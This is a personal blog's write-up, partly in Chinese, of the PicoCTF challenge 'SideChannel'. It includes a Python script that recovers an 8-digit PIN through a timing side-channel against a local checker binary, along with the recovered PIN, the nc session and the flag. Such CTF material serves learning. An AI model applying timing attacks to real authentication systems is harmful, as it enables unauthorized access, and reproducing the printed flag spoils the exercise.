<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  PicoCTF - SideChannel
  #


  Description
  #


There&rsquo;s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you&rsquo;ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
Hint 1: Read about &ldquo;timing-based side-channel attacks.&rdquo;
Hint 2: Attempting to reverse-engineer or exploit the binary won&rsquo;t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
Hint 3: Don&rsquo;t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - SideChannel"><meta property="og:description" content="PicoCTF - SideChannel # Description # There’s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you’ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
Hint 1: Read about “timing-based side-channel attacks.” Hint 2: Attempting to reverse-engineer or exploit the binary won’t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it. Hint 3: Don’t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Misc"><title>PicoCTF - SideChannel | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - SideChannel</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---sidechannel>PicoCTF - SideChannel
<a class=anchor href=#picoctf---sidechannel>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>There&rsquo;s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you&rsquo;ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.</p><p>Hint 1: Read about &ldquo;timing-based side-channel attacks.&rdquo;
Hint 2: Attempting to reverse-engineer or exploit the binary won&rsquo;t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
Hint 3: Don&rsquo;t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.</p></blockquote><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題也是直接看<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>才知道怎麼解，應該說原本大概也猜到是這樣解，但過程一直不順利，所以沒寫出來，最主要是一開始沒看hint所以reverse/binary exploitation花了太多時間，結果一無所獲，但大致上思路沒差多少，也就是輸入的pin digit如我是對的就會比一般錯誤的pin digit還要多花點時間處理，所以我們就可以鎖定每一個digit原本到底是甚麼</p><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> subprocess <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> trange
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>time_lapse <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>guess_pin <span style=color:#f92672>=</span> list(<span style=color:#e6db74>&#34;99999999&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> trange(<span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>        guess_pin[i] <span style=color:#f92672>=</span> str(j)
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(guess_pin)
</span></span><span style=display:flex><span>        start <span style=color:#f92672>=</span> time_ns()
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> Popen(<span style=color:#e6db74>&#34;./pin_checker&#34;</span>, stdin<span style=color:#f92672>=</span>PIPE, stdout<span style=color:#f92672>=</span>PIPE, universal_newlines<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, shell<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>communicate(input<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>        time_lapse<span style=color:#f92672>.</span>append(time_ns() <span style=color:#f92672>-</span> start)
</span></span><span style=display:flex><span>    guess_pin[i] <span style=color:#f92672>=</span> str(time_lapse<span style=color:#f92672>.</span>index(max(time_lapse)))
</span></span><span style=display:flex><span>    time_lapse <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(guess_pin))
</span></span></code></pre></div><p>另外這隻程式不是百分百保證成功，還是要多跑幾次確定一下是不是每次都一樣再進行確認</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#ae81ff>48390513</span> | ./pin_checker
</span></span><span style=display:flex><span>Please enter your 8-digit PIN code:
</span></span><span style=display:flex><span><span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>Checking PIN...
</span></span><span style=display:flex><span>Access granted. You may use your PIN to log into the master server.
</span></span><span style=display:flex><span>$ echo <span style=color:#ae81ff>48390513</span> | nc saturn.picoctf.net <span style=color:#ae81ff>50364</span>
</span></span><span style=display:flex><span>Verifying that you are a human...
</span></span><span style=display:flex><span>Please enter the master PIN code:
</span></span><span style=display:flex><span>Password correct. Here<span style=color:#960050;background-color:#1e0010>&#39;</span>s your flag:
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>t1m1ng_4tt4ck_9803bd25<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Flag: <code>picoCTF{t1m1ng_4tt4ck_9803bd25}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href="https://youtu.be/6-GmrNobEyA?si=0HVfVpNwLT_yNm3G">picoGym (picoCTF) Exercise: SideChannel </a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>